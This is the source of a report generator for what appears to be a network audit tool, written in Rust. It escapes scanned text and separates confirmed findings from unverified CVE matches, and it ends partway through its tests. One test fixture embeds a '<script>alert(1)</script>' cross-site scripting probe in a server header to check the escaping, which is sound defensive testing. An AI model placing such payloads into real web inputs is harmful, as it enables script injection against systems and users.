//! `meow report`: compiles the workspace into `REPORT.md`.
//!
//! No AI and no network are involved: the report is assembled from
//! `graph.json`, `state.db`, `replay.sh` and `chats/*.md`. Evidence and
//! conclusions stay apart: only advisories the operator marked `Confirmed`
//! are listed as findings; everything matched automatically is listed as an
//! unverified hypothesis.

use std::fmt::Write as _;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use anyhow::{Context, Result};

use crate::checklist;
use crate::cve;
use crate::db::Db;
use crate::evidence::{inert_markdown, Source, VerificationStatus};
use crate::graph::{Advisory, Fact, Graph, Host};
use crate::mode::Mode;
use crate::queue::{self, TaskRow};
use crate::timeutil::now_rfc3339;
use crate::topology::Topology;
use crate::vault::{ExposedSecret, Vault};
use crate::workspace::{write_private_atomic, Workspace};

const MAX_REPLAY_LINES: usize = 600;
const MAX_PATHS_PER_PORT: usize = 80;
const MAX_FACTS_PER_HOST: usize = 80;
const MAX_REPORT_FILE_BYTES: u64 = 4 * 1024 * 1024;

/// Everything the report is built from.
pub struct Inputs {
    pub session: String,
    pub mode: Mode,
    pub generated_utc: String,
    pub graph: Graph,
    pub tasks: Vec<TaskRow>,
    pub secrets: Vec<ExposedSecret>,
    /// Contents of `replay.sh`, if it exists.
    pub replay: Option<String>,
    /// (file name, contents) of each `chats/*.md`.
    pub chats: Vec<(String, String)>,
}

const MAX_TOTAL_CHAT_BYTES: u64 = 64 * 1024 * 1024;
const MAX_CHAT_FILES: usize = 1_000;
const MAX_CHAT_DIR_ENTRIES: usize = 10_000;

fn strip_inline_controls(text: &str) -> String {
    text.chars()
        .filter_map(|ch| match ch {
            '\n' | '\r' | '\t' => Some(' '),
            c if c.is_control() || crate::evidence::is_hidden(c) => None,
            c => Some(c),
        })
        .collect()
}

/// Escapes scanned text for use in Markdown prose and table cells: it is
/// shown as the characters it is. A banner cannot inject HTML, terminal
/// escapes, invisible/bidi characters, break a table, or become an image
/// (fetched by whoever opens the report), a link, emphasis or a heading.
fn md(text: &str) -> String {
    let cleaned = strip_inline_controls(text);
    let mut out = String::with_capacity(cleaned.len() + 8);
    for ch in cleaned.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            // The backslash first of all: `\|` must not become `\\|`, an
            // escaped backslash followed by a real cell border.
            '\\' | '|' | '`' | '*' | '_' | '[' | ']' | '!' | '~' | '#' | '$' => {
                out.push('\\');
                out.push(ch);
            }
            other => out.push(other),
        }
    }
    out
}

/// Scanned text as an inline code span, safe for use inside table cells.
fn code(text: &str) -> String {
    format!(
        "`{}`",
        strip_inline_controls(text)
            .replace('`', "'")
            .replace('|', "\\|")
    )
}

/// [`code`] for a table cell, where a bare `|` ends the cell, code span or
/// not, and a `\` before `|` must not produce `\\|`.
fn code_cell(text: &str) -> String {
    code(&text.replace('\\', "/"))
}

fn clean_chat_line(line: &str) -> String {
    line.chars()
        .filter_map(|ch| match ch {
            '\t' => Some(' '),
            c if c.is_control() || crate::evidence::is_hidden(c) => None,
            c => Some(c),
        })
        .collect()
}

fn find_closing_ticks(bytes: &[u8], from: usize, count: usize) -> Option<usize> {
    let mut i = from;
    while i < bytes.len() {
        if bytes[i] == b'`' {
            let start = i;
            while i < bytes.len() && bytes[i] == b'`' {
                i += 1;
            }
            if i - start == count {
                return Some(start);
            }
        } else {
            i += 1;
        }
    }
    None
}

fn neutralize_unmatched_inline_backticks(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < line.len() {
        if bytes[i] == b'\\' && bytes.get(i + 1).is_some_and(|b| b.is_ascii_punctuation()) {
            out.push('\\');
            out.push(bytes[i + 1] as char);
            i += 2;
            continue;
        }
        if bytes[i] == b'`' {
            let start = i;
            while i < bytes.len() && bytes[i] == b'`' {
                i += 1;
            }
            let tick_len = i - start;
            if let Some(close_at) = find_closing_ticks(bytes, i, tick_len) {
                let end = close_at + tick_len;
                out.push_str(&line[start..end]);
                i = end;
            } else {
                out.extend(std::iter::repeat_n('\'', tick_len));
            }
            continue;
        }
        let ch = line[i..].chars().next().expect("i < line.len()");
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

fn split_blockquote_prefix(line: &str) -> (usize, &str, &str) {
    let bytes = line.as_bytes();
    let mut i = 0;
    let mut depth = 0;
    loop {
        let spaces = bytes[i..]
            .iter()
            .take(4)
            .take_while(|&&b| b == b' ')
            .count();
        if spaces <= 3 && bytes.get(i + spaces) == Some(&b'>') {
            depth += 1;
            i += spaces + 1;
            if bytes.get(i) == Some(&b' ') {
                i += 1;
            }
        } else {
            break;
        }
    }
    (depth, &line[..i], &line[i..])
}

fn is_passive_code_lang(info: &str) -> bool {
    const PASSIVE_LANGS: &[&str] = &[
        "sh",
        "bash",
        "zsh",
        "fish",
        "powershell",
        "ps1",
        "cmd",
        "bat",
        "json",
        "jsonl",
        "yaml",
        "yml",
        "toml",
        "ini",
        "xml",
        "html",
        "css",
        "js",
        "javascript",
        "ts",
        "typescript",
        "py",
        "python",
        "rs",
        "rust",
        "go",
        "c",
        "cpp",
        "java",
        "rb",
        "php",
        "sql",
        "http",
        "diff",
        "nginx",
        "apache",
        "conf",
        "txt",
        "text",
    ];
    PASSIVE_LANGS
        .iter()
        .any(|allowed| info.eq_ignore_ascii_case(allowed))
}

fn fence_opening(line: &str) -> Option<(u8, usize, String)> {
    let indent = line.bytes().take(4).take_while(|&b| b == b' ').count();
    if indent > 3 {
        return None;
    }
    let rest = &line.as_bytes()[indent..];
    let marker = *rest.first()?;
    if marker != b'`' && marker != b'~' {
        return None;
    }
    let len = rest.iter().take_while(|&&b| b == marker).count();
    if len < 3 {
        return None;
    }
    if marker == b'`' && rest[len..].contains(&b'`') {
        return None;
    }
    let info = line[indent + len..].trim();
    let mut normalized = String::from(&line[..indent + len]);
    if is_passive_code_lang(info) {
        normalized.push_str(&info.to_ascii_lowercase());
    }
    Some((marker, len, normalized))
}

fn is_fence_closing(line: &str, marker: u8, min_len: usize) -> bool {
    let indent = line.bytes().take(4).take_while(|&b| b == b' ').count();
    if indent > 3 {
        return false;
    }
    let rest = &line.as_bytes()[indent..];
    let len = rest.iter().take_while(|&&b| b == marker).count();
    len >= min_len && rest[len..].iter().all(|&b| b == b' ' || b == b'\t')
}

/// Writes a chat file into the report: its own headings one level down, and
/// nothing in it live (see [`inert_markdown`]). A code block the text left
/// open is closed, so that it cannot take the rest of the report with it.
fn render_chat_markdown(out: &mut String, text: &str) {
    let mut open_fence: Option<(u8, usize, usize)> = None;
    for line in inert_markdown(text).lines() {
        let (qdepth, qprefix, rest) = split_blockquote_prefix(line);
        if let Some((open, length, fence_qdepth)) = open_fence {
            if qdepth < fence_qdepth {
                // Leaving the blockquote closes the fenced block in CommonMark;
                // emit an explicit closing fence so dialects stay aligned.
                for _ in 0..fence_qdepth {
                    out.push_str("> ");
                }
                out.extend(std::iter::repeat_n(open as char, length));
                out.push('\n');
                open_fence = None;
            } else {
                if qdepth == fence_qdepth && is_fence_closing(rest, open, length) {
                    open_fence = None;
                }
                out.push_str(line);
                out.push('\n');
                continue;
            }
        }
        if let Some((marker, len, normalized_fence)) = fence_opening(rest) {
            open_fence = Some((marker, len, qdepth));
            out.push_str(qprefix);
            out.push_str(&normalized_fence);
            out.push('\n');
            continue;
        }
        let sanitized = neutralize_unmatched_inline_backticks(line);
        let (_, san_qprefix, san_rest) = split_blockquote_prefix(&sanitized);
        let indent = san_rest.bytes().take(4).take_while(|&b| b == b' ').count();
        // Nest the file's own headings below this section, also one that
        // is moved in by up to three spaces (or inside a blockquote).
        if indent <= 3 && san_rest.as_bytes().get(indent) == Some(&b'#') {
            out.push_str(san_qprefix);
            out.push_str(&san_rest[..indent]);
            out.push_str("###");
            out.push_str(&san_rest[indent..]);
        } else {
            out.push_str(&sanitized);
        }
        out.push('\n');
    }
    if let Some((marker, length, fence_qdepth)) = open_fence {
        for _ in 0..fence_qdepth {
            out.push_str("> ");
        }
        out.extend(std::iter::repeat_n(marker as char, length));
        out.push('\n');
    }
}

fn status_of(advisory: &Advisory) -> VerificationStatus {
    advisory.record.verification_status
}

fn advisories_with(graph: &Graph, status: VerificationStatus) -> Vec<(&Host, &Advisory)> {
    let mut found: Vec<(&Host, &Advisory)> = graph
        .hosts
        .values()
        .flat_map(|host| host.advisories.iter().map(move |advisory| (host, advisory)))
        .filter(|(_, advisory)| status_of(advisory) == status)
        .collect();
    // Known-exploited first, then by severity score.
    found.sort_by(|a, b| {
        let rank =
            |advisory: &Advisory| (!advisory.kev, -(advisory.cvss.unwrap_or(0.0) * 10.0) as i64);
        rank(a.1)
            .cmp(&rank(b.1))
            .then(a.0.address.cmp(&b.0.address))
    });
    found
}

fn severity(advisory: &Advisory) -> String {
    match (&advisory.severity, advisory.cvss) {
        (Some(severity), Some(score)) => format!("{severity} {score:.1}"),
        (Some(severity), None) => severity.clone(),
        (None, Some(score)) => format!("{score:.1}"),
        (None, None) => "-".to_owned(),
    }
}

fn fact_line(fact: &Fact) -> String {
    format!(
        "- {} _({}, {:?}, {}, {})_",
        md(&fact.claim),
        fact.record.source.as_str(),
        fact.record.confidence,
        fact.record.verification_status,
        md(&fact.record.timestamp_utc)
    )
}

fn render_host(out: &mut String, host: &Host) {
    let _ = writeln!(out, "### {}\n", md(&host.label()));
    if let Some(os) = &host.os {
        let _ = writeln!(out, "Operating system: {}\n", md(os));
    }
    if let Some(asn) = &host.asn {
        let pfx = host
            .bgp_prefix
            .as_deref()
            .map(|p| format!(" ({})", md(p)))
            .unwrap_or_default();
        let _ = writeln!(out, "ASN / Hosting: {}{pfx}\n", md(asn));
    }
    if let Some(ipv6) = &host.ipv6_dns {
        let _ = writeln!(out, "IPv6 DNS: {}\n", md(ipv6));
    }
    if let Some(waf) = &host.waf_cdn {
        let _ = writeln!(out, "WAF / CDN: {}\n", md(waf));
    }
    if !host.hops.is_empty() {
        let route_str: Vec<String> = host.hops.iter().map(|h| md(h)).collect();
        let _ = writeln!(out, "Traceroute hops: {}\n", route_str.join(" -> "));
    }
    if host.ports.is_empty() {
        out.push_str("No ports seen.\n\n");
    } else {
        out.push_str(
            "| Port | State | Service | Product | Version | Extra |\n|---|---|---|---|---|---|\n",
        );
        for port in host.ports.values() {
            let cell =
                |value: &Option<String>| value.as_deref().map(md).unwrap_or_else(|| "-".to_owned());
            let mut extra = Vec::new();
            if let Some(http) = &port.http {
                if let Some(server) = &http.server {
                    extra.push(format!("Server: {}", md(server)));
                }
                if let Some(title) = &http.title {
                    extra.push(format!("Title: {}", md(title)));
                }
                if let Some(waf) = &http.waf {
                    extra.push(format!("WAF: {}", md(waf)));
                }
                if let Some(hash) = http.favicon_hash {
                    match &http.favicon_framework {
                        Some(fw) => extra.push(format!("Favicon: {hash} ({})", md(fw))),
                        None => extra.push(format!("Favicon: {hash}")),
                    }
                }
                if !http.missing_headers.is_empty() {
                    let mh: Vec<String> = http.missing_headers.iter().map(|h| md(h)).collect();
                    extra.push(format!("Missing headers: {}", mh.join(", ")));
                }
                if !http.tls_versions.is_empty() {
                    let tv: Vec<String> = http.tls_versions.iter().map(|v| md(v)).collect();
                    extra.push(format!("TLS: {}", tv.join(", ")));
                }
            }
            if !port.tls_sans.is_empty() {
                let names: Vec<String> = port.tls_sans.iter().map(|n| md(n)).collect();
                extra.push(format!("TLS names: {}", names.join(", ")));
            }
            let _ = writeln!(
                out,
                "| {} | {} | {} | {} | {} | {} |",
                md(&port.key()),
                md(&port.state),
                cell(&port.service),
                cell(&port.product),
                cell(&port.version),
                if extra.is_empty() {
                    "-".to_owned()
                } else {
                    extra.join("; ")
                }
            );
        }
        out.push('\n');
    }
    for port in host.ports.values() {
        let paths = port.paths.walk();
        if paths.is_empty() {
            continue;
        }
        let _ = writeln!(out, "Paths on {}:\n", md(&port.key()));
        for (path, node) in paths.iter().take(MAX_PATHS_PER_PORT) {
            let status = node.status.map(|s| format!(" ({s})")).unwrap_or_default();
            let _ = writeln!(out, "- {}{status}", code(path));
        }
        if paths.len() > MAX_PATHS_PER_PORT {
            let _ = writeln!(
                out,
                "- ... {} more not listed",
                paths.len() - MAX_PATHS_PER_PORT
            );
        }
        out.push('\n');
    }

    let facts: Vec<&Fact> = host
        .facts
        .iter()
        .chain(host.ports.values().flat_map(|p| p.facts.iter()))
        .collect();
    let (notes, observed): (Vec<&Fact>, Vec<&Fact>) = facts
        .into_iter()
        .partition(|f| f.record.source == Source::ManualNote);
    if !observed.is_empty() {
        out.push_str("Observed evidence:\n\n");
        for fact in observed.iter().take(MAX_FACTS_PER_HOST) {
            let _ = writeln!(out, "{}", fact_line(fact));
        }
        if observed.len() > MAX_FACTS_PER_HOST {
            let _ = writeln!(
                out,
                "- ... {} more not listed",
                observed.len() - MAX_FACTS_PER_HOST
            );
        }
        out.push('\n');
    }
    if !notes.is_empty() {
        out.push_str("Operator notes:\n\n");
        for note in notes {
            let _ = writeln!(
                out,
                "- {} _({})_",
                md(&note.claim),
                md(&note.record.timestamp_utc)
            );
        }
        out.push('\n');
    }
}

/// Renders the report. Pure: the same inputs give the same text.
pub fn render(inputs: &Inputs) -> String {
    let graph = &inputs.graph;
    let confirmed = advisories_with(graph, VerificationStatus::Confirmed);
    let hypotheses = advisories_with(graph, VerificationStatus::UnverifiedHypothesis);
    let dismissed = advisories_with(graph, VerificationStatus::FalsePositive);
    let mut out = String::new();

    let _ = writeln!(out, "# Audit report: {}\n", md(&inputs.session));
    let _ = writeln!(
        out,
        "Generated {} by meow {} from local workspace files (no AI, no network). Mode: {}.\n",
        md(&inputs.generated_utc),
        env!("CARGO_PKG_VERSION"),
        inputs.mode
    );
    let _ = writeln!(
        out,
        "| Hosts | Confirmed findings | Unverified hypotheses | False positives | Secrets to rotate |\n\
         |---|---|---|---|---|\n| {} | {} | {} | {} | {} |\n",
        graph.hosts.len(),
        confirmed.len(),
        hypotheses.len(),
        dismissed.len(),
        inputs.secrets.len()
    );
    out.push_str(
        "> This report is not masked. It contains real addresses and host names, and the command \
         trail may contain credentials typed during the session. Review it before sharing.\n\n",
    );

    out.push_str("## Topology\n\n```mermaid\n");
    out.push_str(&Topology::build(graph).mermaid());
    out.push_str("```\n\n");
    if !graph.local.warnings.is_empty() {
        out.push_str("Route warnings:\n\n");
        for warning in &graph.local.warnings {
            let _ = writeln!(out, "- {}", md(warning));
        }
        out.push('\n');
    }

    // What to do, before the lists of what was matched: one update per
    // piece of software usually answers every advisory matched on it.
    let fixes: Vec<(&Host, cve::FixItem)> = graph
        .hosts
        .values()
        .flat_map(|host| cve::fix_plan(host).into_iter().map(move |fix| (host, fix)))
        .collect();
    if !fixes.is_empty() {
        out.push_str("## What to update\n\n");
        out.push_str(
            "One line per piece of software. The advisories behind each line were matched by \
             version number only; a system that takes security updates from its vendor may \
             already carry the fix under the same version number.\n\n",
        );
        for (host, fix) in &fixes {
            let known = if fix.kev > 0 {
                format!(", {} known exploited", fix.kev)
            } else {
                String::new()
            };
            let _ = writeln!(
                out,
                "- {}: {} (answers {}{known})",
                md(&host.label()),
                md(&fix.action),
                fix.advisories
            );
        }
        out.push('\n');
    }

    out.push_str("## Confirmed findings\n\n");
    if confirmed.is_empty() {
        out.push_str("None. No hypothesis has been confirmed by the operator yet.\n\n");
    }
    for (host, advisory) in &confirmed {
        let _ = writeln!(out, "### {} on {}\n", md(&advisory.id), md(&host.label()));
        // Fixed words first: a title cannot start the line as a list
        // item, a quote or a heading of its own.
        let _ = writeln!(out, "Summary: {}\n", md(&advisory.title));
        let _ = writeln!(out, "- Severity: {}", md(&severity(advisory)));
        if advisory.kev {
            out.push_str("- Listed in the CISA Known Exploited Vulnerabilities catalog\n");
        }
        let _ = writeln!(
            out,
            "- Port: {}",
            md(advisory.port.as_deref().unwrap_or("-"))
        );
        let _ = writeln!(out, "- Matched on: {}", code(&advisory.matched));
        if let Some(fixed) = &advisory.fixed_in {
            let _ = writeln!(out, "- Fixed in: {}", md(fixed));
        } else if let Some(last) = &advisory.last_affected {
            let _ = writeln!(out, "- Affected up to: {}", md(last));
        }
        let _ = writeln!(
            out,
            "- Source: {} ({:?} confidence), matched {}",
            advisory.record.source.as_str(),
            advisory.record.confidence,
            md(&advisory.record.timestamp_utc)
        );
        let _ = writeln!(out, "- Evidence: {}", code(&advisory.record.evidence));
        for reference in &advisory.references {
            let _ = writeln!(out, "- Reference: {}", md(reference));
        }
        out.push('\n');
    }

    out.push_str("## Unverified hypotheses\n\n");
    if hypotheses.is_empty() {
        out.push_str("None.\n\n");
    } else {
        out.push_str(
            "Matched automatically from vulnerability databases. Each needs verification before it \
             counts as a finding.\n\n\
             | Host | Advisory | Severity | KEV | Port | Checklist | Deep research ready | Summary |\n\
             |---|---|---|---|---|---|---|---|\n",
        );
        for (host, advisory) in &hypotheses {
            let list = checklist::for_advisory(graph, host, advisory);
            let (done, total) = list.progress();
            let _ = writeln!(
                out,
                "| {} | {} | {} | {} | {} | {done}/{total} | {} | {} |",
                md(&host.address),
                md(&advisory.id),
                md(&severity(advisory)),
                if advisory.kev { "yes" } else { "-" },
                md(advisory.port.as_deref().unwrap_or("-")),
                if list.research_ready() { "yes" } else { "no" },
                md(&advisory.title)
            );
        }
        out.push('\n');
    }

    if !dismissed.is_empty() {
        out.push_str("## Dismissed as false positives\n\n");
        for (host, advisory) in &dismissed {
            let _ = writeln!(
                out,
                "- {} on {}: {}",
                md(&advisory.id),
                md(&host.address),
                md(&advisory.title)
            );
        }
        out.push('\n');
    }

    out.push_str("## Hosts\n\n");
    if graph.hosts.is_empty() {
        out.push_str("No hosts recorded.\n\n");
    }
    for host in graph.hosts.values() {
        render_host(&mut out, host);
    }
    if !graph.notes.is_empty() {
        out.push_str("### Workspace notes\n\n");
        for note in &graph.notes {
            let _ = writeln!(
                out,
                "- {} _({}, {})_",
                md(&note.claim),
                note.record.source.as_str(),
                md(&note.record.timestamp_utc)
            );
            if note.record.source == Source::GitDiff {
                let cleaned_diff: String = note
                    .record
                    .evidence
                    .lines()
                    .map(|line| clean_chat_line(line).replace("```", "'''"))
                    .collect::<Vec<_>>()
                    .join("\n");
                let _ = writeln!(out, "\n```diff\n{cleaned_diff}\n```\n");
            }
        }
        out.push('\n');
    }

    out.push_str("## Secrets to rotate\n\n");
    if inputs.secrets.is_empty() {
        out.push_str("No secret has been seen in data prepared for the cloud tiers.\n\n");
    } else {
        out.push_str(
            "These appeared in session data. Treat them as exposed and rotate them. Only a short \
             hint is shown here.\n\n| Placeholder | Hint | First seen |\n|---|---|---|\n",
        );
        for secret in &inputs.secrets {
            let _ = writeln!(
                out,
                "| {} | {} | {} |",
                code_cell(&secret.token),
                code_cell(&secret.preview),
                md(&secret.first_seen_utc)
            );
        }
        out.push('\n');
    }

    out.push_str("## Background tasks\n\n");
    if inputs.tasks.is_empty() {
        out.push_str("No recon task was queued.\n\n");
    } else {
        out.push_str(
            "| Task | Target | Mode | Stage | Status | Detail |\n|---|---|---|---|---|---|\n",
        );
        for task in inputs.tasks.iter().rev() {
            for stage in &task.stages {
                let _ = writeln!(
                    out,
                    "| {} | {} | {} | {} | {} | {} |",
                    task.id,
                    md(&task.target),
                    task.mode,
                    stage.stage.as_str(),
                    md(&stage.status),
                    md(&stage.detail)
                );
            }
        }
        out.push('\n');
    }

    out.push_str("## Command trail (replay.sh)\n\n");
    match &inputs.replay {
        None => {
            out.push_str("No commands were recorded (the session shell had no replay hooks).\n\n")
        }
        Some(replay) => {
            let lines: Vec<&str> = replay.lines().collect();
            if lines.len() > MAX_REPLAY_LINES {
                let _ = writeln!(
                    out,
                    "Showing the last {MAX_REPLAY_LINES} of {} lines; the full trail is in `replay.sh`.\n",
                    lines.len()
                );
            }
            out.push_str("```sh\n");
            for line in lines
                .iter()
                .skip(lines.len().saturating_sub(MAX_REPLAY_LINES))
            {
                // A fence inside the trail must not end the block.
                let cleaned = clean_chat_line(line);
                out.push_str(&cleaned.replace("```", "'''").replace("~~~", "---"));
                out.push('\n');
            }
            out.push_str("```\n\n");
        }
    }

    out.push_str("## AI triage notes\n\n");
    if inputs.chats.is_empty() {
        out.push_str("No AI request was made.\n\n");
    }
    for (name, text) in &inputs.chats {
        let _ = writeln!(out, "### From chats/{}\n", md(name));
        render_chat_markdown(&mut out, text);
        out.push('\n');
    }
    out
}

/// Renders a single-host engagement report containing that host's Evidence,
/// confirmed Advisories, unverified hypotheses, operator notes, and AI
/// remediation chat (`chats/<address>.md`).
pub fn render_host_report(inputs: &Inputs, address: &str) -> Option<String> {
    let host = inputs.graph.host(address)?.clone();
    let canonical = host.address.clone();
    let chat_file = crate::ai::chat_file_name(&canonical);
    let mut sub_graph = Graph::default();
    sub_graph.hosts.insert(canonical.clone(), host.clone());
    let tasks = inputs
        .tasks
        .iter()
        .filter(|t| {
            t.target.eq_ignore_ascii_case(&canonical)
                || host
                    .hostnames
                    .iter()
                    .any(|h| h.eq_ignore_ascii_case(&t.target))
        })
        .cloned()
        .collect();
    let chats = inputs
        .chats
        .iter()
        .filter(|(name, _)| name == &chat_file || name == &format!("{canonical}.md"))
        .cloned()
        .collect();
    let filtered = Inputs {
        session: format!("{} ({})", inputs.session, host.label()),
        mode: inputs.mode,
        generated_utc: inputs.generated_utc.clone(),
        graph: sub_graph,
        tasks,
        secrets: Vec::new(),
        replay: None,
        chats,
    };
    Some(render(&filtered))
}

fn read_regular_capped(path: &std::path::Path, max_bytes: u64) -> Option<String> {
    use std::io::Read as _;
    if max_bytes == 0 {
        return None;
    }
    let meta = std::fs::symlink_metadata(path).ok()?;
    if meta.file_type().is_symlink() || !meta.is_file() {
        return None;
    }
    let file = crate::workspace::private_open_options()
        .read(true)
        .open(path)
        .ok()?;
    if !file.metadata().ok()?.is_file() {
        return None;
    }
    let mut buf = Vec::new();
    file.take(max_bytes).read_to_end(&mut buf).ok()?;
    Some(String::from_utf8_lossy(&buf).into_owned())
}

/// Reads `replay.sh` and `chats/*.md` from `workspace_dir` with size caps.
pub fn read_chats_and_replay(
    workspace_dir: &std::path::Path,
) -> (Option<String>, Vec<(String, String)>) {
    let mut chat_files = Vec::new();
    if let Ok(entries) = std::fs::read_dir(workspace_dir.join("chats")) {
        for entry in entries.flatten().take(MAX_CHAT_DIR_ENTRIES) {
            let path = entry.path();
            if path.extension().is_some_and(|ext| ext == "md") {
                chat_files.push((entry.file_name().to_string_lossy().into_owned(), path));
            }
        }
    }
    chat_files.sort_by(|a, b| a.0.cmp(&b.0));
    chat_files.truncate(MAX_CHAT_FILES);
    let mut remaining_chat_bytes = MAX_TOTAL_CHAT_BYTES;
    let mut chats = Vec::new();
    for (name, path) in chat_files {
        if remaining_chat_bytes == 0 {
            break;
        }
        let limit = MAX_REPORT_FILE_BYTES.min(remaining_chat_bytes);
        if let Some(text) = read_regular_capped(&path, limit) {
            remaining_chat_bytes = remaining_chat_bytes.saturating_sub(text.len() as u64);
            chats.push((name, text));
        }
    }
    let replay = read_regular_capped(&workspace_dir.join("replay.sh"), MAX_REPORT_FILE_BYTES);
    (replay, chats)
}

/// Gathers the report inputs from a workspace on disk.
pub fn collect(workspace: &Workspace) -> Result<Inputs> {
    let db = Arc::new(Mutex::new(Db::open(&workspace.state_db_path())?));
    let tasks = queue::tasks(&db.lock().unwrap_or_else(|p| p.into_inner()), 200)?;
    let secrets = Vault::open(Arc::clone(&db))?.exposed_secrets();
    let (replay, chats) = read_chats_and_replay(&workspace.dir);
    Ok(Inputs {
        session: workspace.name.clone(),
        mode: workspace.profile.mode,
        generated_utc: now_rfc3339(),
        graph: Graph::load(&workspace.graph_path())?,
        tasks,
        secrets,
        replay,
        chats,
    })
}

/// Writes `REPORT.md` into the workspace and returns its path.
pub fn write(workspace: &Workspace) -> Result<PathBuf> {
    let inputs = collect(workspace)?;
    let path = workspace.dir.join("REPORT.md");
    write_private_atomic(&path, render(&inputs).as_bytes()).context("cannot write REPORT.md")?;
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::{Confidence, EvidenceRecord};
    use crate::graph::{Observation, Route};
    use crate::queue::{Stage, StageRow};

    fn advisory(id: &str, cvss: f64, kev: bool) -> Advisory {
        Advisory {
            fixed_in: None,
            last_affected: None,
            id: id.into(),
            title: format!("{id} summary with <b>markup</b> | pipe"),
            severity: Some("HIGH".into()),
            cvss: Some(cvss),
            kev,
            matched: "cpeName=cpe:2.3:a:nginx:nginx:1.18.0:*:*:*:*:*:*:*".into(),
            port: Some("443/tcp".into()),
            references: vec!["https://nvd.nist.gov/vuln/detail/CVE-2021-23017".into()],
            record: EvidenceRecord::hypothesis(
                Source::NvdApi,
                Confidence::Medium,
                "{\"id\":\"x\"}",
            ),
        }
    }

    fn inputs() -> Inputs {
        let mut graph = Graph::default();
        graph.apply(Observation::Port {
            address: "10.10.10.5".into(),
            port: 443,
            protocol: "tcp".into(),
            state: "open".into(),
            service: Some("ssl/http".into()),
            product: Some("nginx".into()),
            version: Some("1.18.0".into()),
            extra_info: None,
            cpes: vec![],
            record: EvidenceRecord::observed(
                Source::NmapXml,
                Confidence::High,
                "<port portid=\"443\"/>",
            ),
        });
        graph.apply(Observation::Http {
            address: "10.10.10.5".into(),
            port: 443,
            scheme: "https".into(),
            server: Some("nginx/1.18.0 <script>alert(1)</script>".into()),
            location: None,
            record: EvidenceRecord::observed(Source::HttpHeader, Confidence::High, "Server: nginx"),
        });
        graph.apply(Observation::Path {
            address: "10.10.10.5".into(),
            port: 443,
            scheme: "https".into(),
            path: "/admin/login.php".into(),
            status: Some(200),
            record: EvidenceRecord::observed(Source::FeroxJson, Confidence::High, "{}"),
        });
        graph.apply(Observation::Note {
            address: Some("10.10.10.5".into()),
            text: "default creds rejected".into(),
            record: EvidenceRecord::observed(Source::ManualNote, Confidence::Medium, "x"),
        });
        graph.apply(Observation::Note {
            address: None,
            text: "git diff: nginx.conf (+1 -1)".into(),
            record: EvidenceRecord::observed_block(
                Source::GitDiff,
                Confidence::High,
                "@@ -1 +1 @@\n-tokens on\n+tokens off",
            ),
        });
        graph.apply(Observation::Port {
            address: "10.10.10.9".into(),
            port: 22,
            protocol: "tcp".into(),
            state: "open".into(),
            service: Some("ssh".into()),
            product: None,
            version: None,
            extra_info: None,
            cpes: vec![],
            record: EvidenceRecord::observed(
                Source::PtyRegex,
                Confidence::Medium,
                "22/tcp open ssh",
            ),
        });
        graph.local.routes.push(Route {
            destination: "10.10.10.0/23".into(),
            gateway: Some("10.10.14.1".into()),
            interface: "tun0".into(),
        });
        graph
            .local
            .warnings
            .push("Listener tcp/192.168.1.5:8000 is bound to eth0".into());
        graph.add_advisory("10.10.10.5", advisory("CVE-2021-23017", 7.7, true));
        graph.add_advisory("10.10.10.5", advisory("CVE-2019-0001", 9.8, false));
        graph.add_advisory("10.10.10.5", advisory("CVE-2018-0002", 5.0, false));
        graph.add_advisory("10.10.10.9", advisory("CVE-2020-0003", 6.0, false));
        graph
            .set_advisory_status(
                "10.10.10.5",
                "CVE-2021-23017",
                VerificationStatus::Confirmed,
            )
            .unwrap();
        graph
            .set_advisory_status(
                "10.10.10.5",
                "CVE-2018-0002",
                VerificationStatus::FalsePositive,
            )
            .unwrap();

        let stage = |stage, status: &str, detail: &str| StageRow {
            stage,
            status: status.into(),
            detail: detail.into(),
        };
        Inputs {
            session: "acme".into(),
            mode: Mode::Mild,
            generated_utc: "2026-11-12T09:41:00Z".into(),
            graph,
            tasks: vec![TaskRow {
                id: 1,
                target: "10.10.10.0/23".into(),
                mode: Mode::Mild,
                extra_flags: vec![],
                created_utc: String::new(),
                stages: vec![
                    stage(Stage::Ports, "done", "2 hosts up"),
                    stage(Stage::Services, "done", ""),
                    stage(Stage::Crawl, "skipped", "katana is not installed"),
                    stage(Stage::Dirs, "skipped", "no wordlist found"),
                ],
            }],
            secrets: vec![ExposedSecret {
                token: "<<SEC_01>>".into(),
                preview: "eyJh... (71 chars)".into(),
                first_seen_utc: "2026-11-12T09:00:00Z".into(),
            }],
            replay: Some("# header\n# [CWD] /work\nnmap -sV 10.10.10.5\n# [EXIT] 0\necho '```'\n".into()),
            chats: vec![(
                "10.10.10.5.md".into(),
                "# Triage notes for 10.10.10.5\n\n## 2026-11-12T09:30:00Z · [C] Cloud triage · m\n\n## 1. Risk\nUpgrade nginx.\n\n_Cost: $0.0042_\n".into(),
            )],
        }
    }

    #[test]
    fn confirmed_findings_and_hypotheses_are_kept_apart() {
        let text = render(&inputs());
        let section = |title: &str| -> &str {
            let start = text
                .find(&format!("## {title}\n"))
                .unwrap_or_else(|| panic!("no section {title}"));
            let rest = &text[start + 3..];
            let end = rest.find("\n## ").map_or(rest.len(), |i| i + 1);
            &rest[..end]
        };

        let confirmed = section("Confirmed findings");
        assert!(
            confirmed.contains("### CVE-2021-23017 on 10.10.10.5"),
            "{confirmed}"
        );
        assert!(confirmed.contains("Listed in the CISA Known Exploited Vulnerabilities catalog"));
        assert!(confirmed.contains("- Severity: HIGH 7.7"));
        assert!(confirmed.contains("- Evidence: `{\"id\":\"x\"}`"));
        for other in ["CVE-2019-0001", "CVE-2018-0002", "CVE-2020-0003"] {
            assert!(
                !confirmed.contains(other),
                "{other} is not confirmed but is listed as a finding"
            );
        }

        let hypotheses = section("Unverified hypotheses");
        assert!(!hypotheses.contains("CVE-2021-23017"));
        assert!(!hypotheses.contains("CVE-2018-0002"));
        // Highest score first; checklist progress and readiness per row.
        let first = hypotheses.find("CVE-2019-0001").unwrap();
        let second = hypotheses.find("CVE-2020-0003").unwrap();
        assert!(first < second);
        assert!(
            hypotheses
                .contains("| 10.10.10.5 | CVE-2019-0001 | HIGH 9.8 | - | 443/tcp | 5/6 | yes |"),
            "{hypotheses}"
        );
        assert!(
            hypotheses
